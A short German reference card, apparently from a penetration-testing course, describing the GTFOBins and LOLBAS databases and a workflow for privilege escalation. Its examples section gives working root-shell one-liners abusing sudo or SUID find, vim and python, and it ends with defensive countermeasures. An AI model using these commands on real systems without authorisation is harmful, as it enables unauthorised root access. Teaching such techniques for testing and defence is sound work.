# GTFOBins / LOLBAS (Referenz)

**Kategorie:** Referenz-Datenbank (Living off the Land)

Kuratierte Nachschlagewerke, wie **legitime System-Binaries** für Privilege Escalation, Shell-Escape, Datei-Lesen/-Schreiben oder Datentransfer missbraucht werden. Keine Installation – **Web-Referenzen**, die man beim PrivEsc gezielt nachschlägt.

| Ressource | Für | URL |
|-----------|-----|-----|
| **GTFOBins** | Unix/Linux-Binaries | gtfobins.github.io |
| **LOLBAS** | Windows-Binaries/Scripts | lolbas-project.github.io |

## Nutzung (Workflow)

1. PrivEsc-Vektor finden (z. B. `sudo -l` → `find`, oder SUID-Binary).
2. Binary in GTFOBins suchen → passende **Funktion** wählen:
   - **Sudo** (Binary ist sudo-erlaubt), **SUID** (Binary hat SUID-Bit), **Capabilities**, **Shell**, **File read/write**, **Limited SUID**.
3. Das angegebene Kommando ausführen.

## Beispiele (GTFOBins)

```bash
sudo find . -exec /bin/sh \; -quit        # find (Sudo)
find . -exec /bin/sh -p \; -quit          # find (SUID)
sudo vim -c ':!/bin/sh'                    # vim (Sudo)
./python -c 'import os;os.setuid(0);os.system("/bin/sh")'   # python (SUID)
```

## Hinweis

„Living off the Land" = vorhandene, vertrauenswürdige Tools als Angriffsmittel → umgeht oft Allowlisting/AV. Gegenmaßnahme: least privilege (keine shell-/escapefähigen Binaries mit sudo/SUID), Monitoring ungewöhnlicher Binary-Nutzung.

## Verwendet in

privilege-escalation 03 (Sudo), 04 (SUID), 07 (Capabilities); Windows-Pendant LOLBAS in 09.
